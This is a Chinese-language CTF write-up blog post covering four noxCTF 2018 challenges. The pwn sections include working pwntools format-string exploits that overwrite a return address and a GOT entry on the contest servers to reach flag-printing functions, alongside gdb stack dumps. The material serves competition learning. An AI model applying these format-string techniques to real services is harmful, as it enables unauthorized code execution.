<!DOCTYPE html>
<html lang="en">





<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#005f6b">
  <meta name="description" content="Software Security Researcher">
  <meta name="author" content>
  <meta name="keywords" content>
  <title>2018-noxCTF - B3ale</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Monday, September 10th 2018, 6:01 pm
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    2.7k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      14 分钟
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <p>记录几道简单题。</p>
<a id="more"></a>
<h1 id="RE-GuessTheString"><a href="#RE-GuessTheString" class="headerlink" title="RE-GuessTheString"></a>RE-GuessTheString</h1><p>把每个 check 分辨出来，然后逐一分析，先判断字符串长度：</p>
<pre><code class="cpp">_BOOL8 __fastcall check1(const char *a1)
{
  return strlen(a1) == 11;
}
</code></pre>
<p>判断每个字符是否都大于 32：</p>
<pre><code class="cpp">__int64 __fastcall check2(_BYTE *s)
{
  char *v2; // [rsp+0h] [rbp-18h]
  _BOOL4 i; // [rsp+14h] [rbp-4h]

  v2 = s;
  for ( i = 1; i &amp;&amp; *v2; i = bigger_than_32(*v2++) )
    ;
  return (unsigned int)i;
}
</code></pre>
<p>第一个字符不等于 66 且第一个字符与第二个字符的乘积为 3478，可分解质因数求解：</p>
<pre><code class="cpp">__int64 __fastcall check3(char *s)
{
  unsigned int v2; // [rsp+14h] [rbp-4h]

  v2 = 1;
  if ( *s == 66 )
  {
    v2 = 0;
  }
  else if ( *s * s[1] != 3478 )
  {
    v2 = 0;
  }
  return v2;
}
</code></pre>
<p>前三个数连续异或得到 49:</p>
<pre><code class="cpp">__int64 __fastcall check4(char *s)
{
  unsigned int v2; // [rsp+14h] [rbp-4h]

  v2 = 1;
  if ( ((unsigned __int8)(s[1] ^ *s) ^ (unsigned __int8)s[2]) != 49 )
    v2 = 0;
  return v2;
}
</code></pre>
<p>第四个数大于第三个数，但是两者平方和相等，显然是溢出，在计算中通过模 256（即 0xFF）来实现：</p>
<pre><code class="cpp">__int64 __fastcall check5(char *s)
{
  unsigned int v2; // [rsp+14h] [rbp-4h]

  v2 = 1;
  if ( s[3] &gt; s[2] )
  {
    if ( s[2] * s[2] != s[3] * s[3] )
      v2 = 0;
  }
  else
  {
    v2 = 0;
  }
  return v2;
}
</code></pre>
<p>接下来还出现了一个检查素数的函数：</p>
<pre><code class="cpp">__int64 __fastcall check_prime(char c)
{
  signed int i; // [rsp+Ch] [rbp-8h]
  unsigned int v3; // [rsp+10h] [rbp-4h]

  v3 = 1;
  if ( (unsigned __int8)c &gt; 1u )
  {
    if ( (unsigned __int8)c &gt; 2u )
    {
      for ( i = 2; v3 &amp;&amp; i &lt; (unsigned __int8)c; ++i )
      {
        if ( !((unsigned __int8)c % i) )
          v3 = 0;
      }
    }
  }
  else
  {
    v3 = 0;
  }
  return v3;
}
</code></pre>
<p>第五和第六个字符相互异或等于 126：</p>
<pre><code class="cpp">__int64 __fastcall check6(char *s)
{
  unsigned int v2; // [rsp+14h] [rbp-4h]

  v2 = 1;
  if ( (unsigned int)check_prime(s[4]) )
  {
    if ( (unsigned int)check_prime(s[5]) )
    {
      if ( ((unsigned __int8)s[4] ^ (unsigned __int8)s[5]) != 126 )
        v2 = 0;
    }
    else
    {
      v2 = 0;
    }
  }
  else
  {
    v2 = 0;
  }
  return v2;
}
</code></pre>
<p>第七个字符的 1/2 是素数，且第七个字符等于第六个字符减去 42 的两倍：</p>
<pre><code class="cpp">__int64 __fastcall check7(char *s)
{
  unsigned int v2; // [rsp+14h] [rbp-4h]

  v2 = 1;
  if ( (unsigned int)check_prime(s[6] / 2) )
  {
    if ( s[6] != 2 * (s[5] - 42) )
      v2 = 0;
  }
  else
  {
    v2 = 0;
  }
  return v2;
}
</code></pre>
<p>第八个数字在 <code>(47, 57]</code> 范围内，右移两位后乘四等于本身：</p>
<pre><code class="cpp">__int64 __fastcall check8(char *s)
{
  unsigned int v2; // [rsp+14h] [rbp-4h]

  v2 = 1;
  if ( s[7] &lt;= 47 || s[7] &gt; 57 )
    v2 = 0;
  if ( 4 * (char)(s[7] &gt;&gt; 2) != s[7] )
    v2 = 0;
  return v2;
}
</code></pre>
<p>传入的数字与第八个字符异或得到第九个字符：</p>
<pre><code class="cpp">_BOOL8 __usercall check9@&lt;rax&gt;(unsigned __int8 a1@&lt;efl&gt;, __int64 a2, char *s)
{
  return s[8] == (a1 ^ (unsigned __int8)s[7]);
}
</code></pre>
<p>两倍关系：</p>
<pre><code class="cpp">__int64 __fastcall check10(char *a1)
{
  unsigned int v2; // [rsp+14h] [rbp-4h]

  v2 = 1;
  if ( 2 * a1[8] != a1[9] )
    v2 = 0;
  return v2;
}
</code></pre>
<p>计算得出第十一个数字：</p>
<pre><code class="cpp">_BOOL8 __fastcall check11(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, char *a8)
{
  __int64 v8; // rcx
  __int16 sum; // ax

  v8 = (unsigned __int8)a8[9];
  sum = 0;
  do
    sum += v8--;
  while ( v8 );
  return a8[10] == HIBYTE(sum) * (_BYTE)sum;
}
</code></pre>
<p>逻辑相对比较常规，但做下来有些耗时。最后写出脚本：</p>
<pre><code class="python">primes = []

for i in range(2, 256):
    for j in range(2, i):
        if i % j == 0:
            break
        else:
            primes.append(i)

s = 11 * [0]

# s[0], s[1] = 37, 94 # %^Jv!_j0&quot;Dz ==&gt; wrong
s[0], s[1] = 47, 74 # /JTl!_j0&quot;Dz ==&gt; right

assert(s[0] * s[1] == 3478)

s[2] = s[0] ^ s[1] ^ 49

for i in range(s[2] + 1, 256):
    if i * i % 256 == s[2] * s[2] % 256:
        s[3] = i
        break

def get456():
    for i in primes:
        for j in primes:
            if i &gt; 32 and j &gt; 32 and (i ^ j) % 256 == 126:
                if j - 42 in primes and 2 * j &lt; 256:
                    return (i, j, 2 * (j - 42))

s[4], s[5], s[6] = get456()

for i in range(48, 58):
    if 4 * (i &gt;&gt; 2) == i:
        s[7] = i
        break

s[8] = 0x12 ^ s[7]

s[9] = 2 * s[8]

s[10] = 0x7A

for c in s:
    assert(c &gt; 32)

print(&#39;&#39;.join(map(chr, s)))
</code></pre>
<p>据说这里可以符号执行用 angr 做。</p>
<h1 id="MISC-Blind-Date"><a href="#MISC-Blind-Date" class="headerlink" title="MISC-Blind Date"></a>MISC-Blind Date</h1><p><code>xxd</code> 一下文件头，根据 jpeg 文件头特征可以发现每四字节被倒过来了：</p>
<pre><code class="shell">~ &gt; xxd BlindDate.jpeg | head
00000000: e0ff d8ff 464a 1000 0100 4649 6000 0101  ....FJ....FI`...
00000010: 0000 6000 2200 e1ff 6669 7845 4d4d 0000  ..`.&quot;...fixEMM..
00000020: 0000 2a00 0100 0800 0300 1201 0100 0000  ..*.............
00000030: 0000 0100 0000 0000 1100 ecff 6b63 7544  ............kcuD
00000040: 0001 0079 0000 0004 ff00 004b 687e 03e1  ...y.......Kh~..
00000050: 3a70 7474 736e 2f2f 6f64 612e 632e 6562  :pttsn//oda.c.eb
00000060: 782f 6d6f 312f 7061 002f 302e 7078 3f3c  x/mo1/pa./0.px?&lt;
00000070: 656b 6361 6562 2074 3d6e 6967 bfbb ef22  ekcaeb t=nig...&quot;
00000080: 6469 2022 3557 223d 704d 304d 6968 6543  di &quot;5W&quot;=pM0MiheC
00000090: 6572 7a48 544e 7a53 636b 7a63 3f22 6439  erzHTNzSckzc?&quot;d9
</code></pre>
<p>用脚本过逆回来：</p>
<pre><code class="python">f = open(&#39;BlindDate.jpeg&#39;, &#39;rb&#39;)
s = f.read()
f.close()

data = &#39;&#39;
for i in range(0, len(s), 4):
    data += s[i:i + 4][::-1]

new_f = open(&#39;re_BlindData.jpeg&#39;, &#39;wb&#39;)
new_f.write(data)
</code></pre>
<p><code>strings</code> 一下新文件，发现一串 base64 字符串：</p>
<pre><code class="base64">Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK
</code></pre>
<p>解开后发现是盲文：</p>
<pre><code class="Braille">..   .  ..  ..   .  ..  ..   .  ..  .  ..
.    .   .       .      .    .   .  .
    ..          ..      .   ..      .  .
</code></pre>
<p>翻译一下之后是：<code>F4C3P4LM</code></p>
<p><code>binwalk</code> 一下新文件，分解出一个带密码的 7z 压缩文件。把上面的字符串作为密码解开，得到 flag 文本，是 brainfuck：</p>
<pre><code class="brainfuck">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++.
</code></pre>
<p>解密得到 flag：<code>noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?}</code></p>
<h1 id="PWN-believeMe"><a href="#PWN-believeMe" class="headerlink" title="PWN-believeMe"></a>PWN-believeMe</h1><p>做出的第一道格式化字符串。拿到题目先 file 一下，然后再看看开了什么保护：</p>
<pre><code class="shell">[noxCTF-believeMe] file believeMe                                      1:36:01
believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped
[noxCTF-believeMe] checksec believeMe                                  1:36:06
[*] &#39;/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<p>然后拖进 ida 中查看：</p>
<pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [esp+14h] [ebp-34h]
  unsigned int v5; // [esp+3Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  puts(aSomeoneToldMeT);
  fflush(stdout);
  fgets(s, 39, stdin);
  s[strcspn(s, &quot;\n&quot;)] = 0;
  printf(s);
  fflush(stdout);
  return 0;
}
</code></pre>
<p>main 函数中对字符串长度做了限制，并且存在明显的格式化字符串漏洞。然后很容易发现有一个奇怪的函数 <code>noxFlag</code>：</p>
<pre><code class="cpp">void __noreturn noxFlag()
{
  char i; // [esp+Bh] [ebp-Dh]
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
  puts(s);
  fflush(stdout);
  if ( stream )
  {
    for ( i = fgetc(stream); i != -1; i = fgetc(stream) )
    {
      putchar(i);
      fflush(stdout);
    }
    fflush(stdout);
    fclose(stream);
  }
  else
  {
    puts(&quot;Can&#39;t read file \n&quot;);
    fflush(stdout);
  }
  exit(0);
}
</code></pre>
<p>由于题目中提到环境是不开启 ASLR 的，那么这道题的思路就很明确：通过格式化字符串，泄漏出 main 函数 ret 的地址，修改为 <code>noxFlag</code> 的地址，得到 <code>flag.txt</code> 的内容。</p>
<p>gdb 调试，通过查看栈上的内容得到  字符串的 offset：</p>
<pre><code class="gdb">gdb-peda$ stack 20
0000| 0xffffceb0 --&gt; 0xffffced4 (&quot;AAAA&quot;)
0004| 0xffffceb4 --&gt; 0x804890c --&gt; 0xa (&#39;\n&#39;)
0008| 0xffffceb8 --&gt; 0xf7fb35a0 --&gt; 0xfbad2288
0012| 0xffffcebc --&gt; 0x7f17
0016| 0xffffcec0 --&gt; 0xffffffff
0020| 0xffffcec4 --&gt; 0x2f (&#39;/&#39;)
0024| 0xffffcec8 --&gt; 0xf7e0ddc8 --&gt; 0x2b76 (&#39;v+&#39;)
0028| 0xffffcecc --&gt; 0xffffcfb4 --&gt; 0xffffd18d (&quot;/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe&quot;)
0032| 0xffffced0 --&gt; 0x8000
0036| 0xffffced4 (&quot;AAAA&quot;)
</code></pre>
<p>关于 ret 的地址，也通过在栈上的观察：</p>
<pre><code class="gdb">0084| 0xffffce94 --&gt; 0xffffceb0 --&gt; 0x1
0088| 0xffffce98 --&gt; 0x0
0092| 0xffffce9c --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
0096| 0xffffcea0 --&gt; 0xf7fb3000 --&gt; 0x1b1db0
--More--(25/50)
0100| 0xffffcea4 --&gt; 0xf7fb3000 --&gt; 0x1b1db0
0104| 0xffffcea8 --&gt; 0x0
0108| 0xffffceac --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;:    add    esp,0x10)
0112| 0xffffceb0 --&gt; 0x1
</code></pre>
<p>可以看到本地 ret 的地址即为 <code>0xffffceac</code>，然后需要利用漏洞，泄漏出远程的地址。仔细观察发现 offset 为 84 和 112 处的联系，即只需要泄漏出 offset 为 84 的  内容，再将结果减去 4 即能  得到远程服务器上 ret 的地址。</p>
<p>格式化字符串漏洞的 payload 还可以利用 <code>pwntools</code> 中的一个函数 <code>fmtstr_payload</code>，用于自动生成格式化字符串。<code>fmtstr_payload</code> 有三个参数：第一个参数是 <code>int</code>，用于表示取参数的偏移个数；第二个参数是字典，字典的意义是往 <code>key</code> 的地址，写入 <code>value</code> 的值；第三个参数 <code>write_size</code>，可以改变 payload 的形式，<code>byte</code> 对应 <code>%hhn</code>，<code>short</code> 对应 <code>%hn</code>，<code>int</code> 对应 <code>%n</code>。</p>
<p>最后可以写出 exp：</p>
<pre><code class="python">from pwn import *
# context.log_level = &#39;DEBUG&#39;
local = 0
if local:
    p = process(&#39;./believeMe&#39;)
else:
    p = remote(&#39;18.223.228.52&#39;, 13337)
flag_addr = 0x0804867B
ret_addr = 0xffffdd2c # local: 0xffffd2bc
offset = 9
# payload = p32(0xdeadbeef) + &#39;%{}$p&#39;.format(str(offset)) # test offset
# payload = &#39;0x%21$08x&#39; # test ret_addr
# payload = p32(ret_addr + 2) + p32(ret_addr) + &#39;%2044c%9$hn%32375c%10$hn&#39;
payload = fmtstr_payload(offset, {ret_addr:flag_addr}, write_size=&#39;short&#39;)
assert(len(payload) &lt; 39)
p.recvuntil(&#39;????&#39;)
# gdb.attach(p, &#39;b *0x80487d3\nc&#39;)
p.sendline(payload)
p.interactive()
</code></pre>
<h1 id="PWN-The-Name-Calculator"><a href="#PWN-The-Name-Calculator" class="headerlink" title="PWN-The Name Calculator"></a>PWN-The Name Calculator</h1><p> 又是一道格式化字符串，还涉及到栈溢出。 先反编译查看 main 函数：</p>
<pre><code class="cpp">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+Ch] [ebp-2Ch]
  int v4; // [esp+28h] [ebp-10h]
  unsigned int v5; // [esp+2Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  puts(&quot;What is your name?&quot;);
  fflush(stdout);
  read(0, &amp;buf, 0x20u);
  fflush(stdin);
  if ( v4 == 0x6A4B825 )
  {
    secretFunc();
  }
  else
  {
    puts(&quot;I&#39;ve heard better&quot;);
    fflush(stdout);
  }
  exit(0);
}
</code></pre>
<p>查看一下 v4 和 buf 在内存中的位置，发现可以溢出进入 <code>secretFunc</code>，看一下这个函数：</p>
<pre><code class="cpp">int secretFunc()
{
  unsigned int v0; // eax
  int *i; // [esp+8h] [ebp-40h]
  ssize_t v3; // [esp+18h] [ebp-30h]
  int buf[7]; // [esp+20h] [ebp-28h]
  unsigned int v5; // [esp+3Ch] [ebp-Ch]
  void *retaddr; // [esp+4Ch] [ebp+4h]

  v5 = __readgsdword(0x14u);
  v0 = 0;
  do
  {
    buf[v0] = 0;
    ++v0;
  }
  while ( v0 &lt; 7 );
  retAddr = (int)retaddr;
  puts(&quot;Say that again please&quot;);
  fflush(stdout);
  v3 = read(0, buf, 0x1Bu);
  *((_BYTE *)buf + v3) = 0;
  fflush(stdin);
  for ( i = buf; i &lt; (int *)((char *)&amp;buf[-1] + v3); i = (int *)((char *)i + 1) )
    *i ^= 0x5F7B4153u;
  puts(&quot;Your name was encrypted using the best encryption in the world&quot;);
  printf(&quot;This is your new name: &quot;);
  printf((const char *)buf);
  fflush(stdout);
  if ( retaddr != (void *)retAddr )
    exit(1);
  return 0;
}
</code></pre>
<p>中间对输入的 buf 进行了异或，从第一字符开始，步长为 1，每次取  四个字符， 转换为 int 型  后与特定数字异或，循环直到倒数第四个字符。后面 buf 这里的 <code>printf</code> 明显存在格式化字符串。 然后又发现了一个 <code>superSecretFunc</code> 函数：</p>
<pre><code class="cpp">int superSecretFunc()
{
  printf(&quot;Here is your flag: &quot;);
  fflush(stdout);
  return system(&quot;cat flag&quot;);
}
</code></pre>
<p>大概知道了是通过格式化字符串修改某个 ret 的地址 ，然后在 <code>superSecretFunc</code> 这里执行 <code>cat flag</code>。回头再看到 main 函数调用了 <code>exit</code>，这里就可以通过修改 <code>exit</code> 的 got 表实现跳转。然后先通过 gdb 调试找到地址：</p>
<pre><code class="gdb">gdb-peda$ pdis exit
Dump of assembler code for function exit@plt:
   0x08048470 &lt;+0&gt;:    jmp    DWORD PTR ds:0x804a024
   0x08048476 &lt;+6&gt;:    push   0x30
   0x0804847b &lt;+11&gt;:    jmp    0x8048400
End of assembler dump.
gdb-peda$ x/wx 0x804a024
0x804a024:    0x08048476
</code></pre>
<p>查看栈上分布，得到字符串的偏移：</p>
<pre><code class="gdb">0000| 0xffbc27e0 --&gt; 0xffbc2810 --&gt; 0xa0a (&#39;\n\n&#39;)
0004| 0xffbc27e4 --&gt; 0xffbc2810 --&gt; 0xa0a (&#39;\n\n&#39;)
0008| 0xffbc27e8 --&gt; 0x1b
0012| 0xffbc27ec --&gt; 0xf75badfb (&lt;_IO_puts+347&gt;:    add    esp,0x10)
0016| 0xffbc27f0 --&gt; 0xf75c31d7 (&lt;_IO_new_file_sync+7&gt;:    add    esi,0x149e29)
0020| 0xffbc27f4 --&gt; 0xf770d000 --&gt; 0x1b1db0
0024| 0xffbc27f8 --&gt; 0xffbc2810 --&gt; 0xa0a (&#39;\n\n&#39;)
0028| 0xffbc27fc --&gt; 0x804879a (&lt;main+112&gt;:    jmp    0x80487bd &lt;main+147&gt;)
0032| 0xffbc2800 (&quot;SA{_&quot;)
0036| 0xffbc2804 --&gt; 0x0
0040| 0xffbc2808 --&gt; 0x2
0044| 0xffbc280c --&gt; 0xf770d000 --&gt; 0x1b1db0
0048| 0xffbc2810 --&gt; 0xa0a (&#39;\n\n&#39;)
</code></pre>
<p>最后的 exp：</p>
<pre><code class="python">from pwn import *
# context.log_level = &#39;DEBUG&#39;
local = 1
if local:
    p = process(&#39;./CAL&#39;)
else:
    p = remote(&#39;chal.noxale.com&#39;, 5678)

def xor_op(s):
    xor_num = 0x5F7B4153
    l = list(s)
    for i in range(len(l) - 4):
        t = &#39;&#39;.join(l[i:i + 4])
        l[i:i + 4] = list(p32(u32(t) ^ xor_num))
    return &#39;&#39;.join(l)

offset1 = 28
v4 = 0x6A4B825
offset2 = 12
exit_got = 0x804a024
super_addr = 0x08048596

# gdb.attach(p, &#39;b *0x8048656&#39;)

p.recvuntil(&#39;name?&#39;)
payload1 = &#39;A&#39; * offset1 + p32(v4)
p.send(payload1)
p.recvuntil(&#39;please&#39;)
payload2 = xor_op(p32(exit_got) + &#39;%34194c%12$hn&#39;)
assert(len(payload2) &lt; 0x1B)
p.send(payload2)

p.interactive()
</code></pre>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-String" target="_blank" rel="noopener">https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-String</a><br><a href="https://github.com/imthoe/noxCTF/tree/master/BlindDate" target="_blank" rel="noopener">https://github.com/imthoe/noxCTF/tree/master/BlindDate</a><br><a href="https://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/</a><br><a href="https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2018/09/12/2018-网鼎杯/">
                        <i class="fa fa-chevron-left"></i>
                        <span>2018-网鼎杯</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2018/09/08/利用VPS搭建Shadowsocks科学上网/">
                        <span>利用VPS搭建Shadowsocks科学上网</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "2018-noxCTF&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
